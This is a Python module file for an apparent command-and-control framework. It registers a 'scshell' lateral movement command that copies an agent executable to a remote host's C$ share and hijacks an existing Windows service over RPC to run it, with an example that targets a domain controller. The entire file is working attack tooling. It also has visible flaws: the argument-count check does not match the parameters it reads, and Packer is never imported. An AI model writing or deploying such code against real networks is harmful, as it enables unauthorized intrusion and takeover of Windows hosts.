from vaelix_host import Agent, RegisterCommand, RegisterModule
from os.path import exists

def scshell( agentID, *params ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    Host      : str   = ""
    SvcName   : str   = ""
    SvcPath   : str   = ""
    SvcBinary : bytes = b''

    agent = Agent( agentID )

    if len(params) < 2:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough arguments" )
        return
    else: 
        Host    = params[ 0 ]
        SvcName = params[ 1 ]
        SvcPath = params[ 2 ]

        if exists( SvcPath ) == False:
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Service executable not found: {SvcPath}" )
            return
        else:
            SvcBinary = open( SvcPath, 'rb' ).read()
            if len(SvcBinary) == 0:
                agent.ConsoleWrite( agent.CONSOLE_ERROR, "Specified service executable is empty" )
                return

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute {SvcPath} on {Host} using scshell" )

    packer.addstr( Host )
    packer.addstr( SvcName )
    packer.addstr( SvcBinary )
    packer.addstr( "\\\\" + Host + "\\C$\\Windows\\" + SvcName + ".exe" )

    agent.InlineExecute( TaskID, "go", f"scshell.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( scshell, "jump-exec", "scshell", "Changes service executable path of an existing service to our specified service executable over RPC", 0, "[Host] [Target Service Name] [Local Path]", "DOMAIN-DC AppVClient /tmp/MyAgentSvc.exe" )
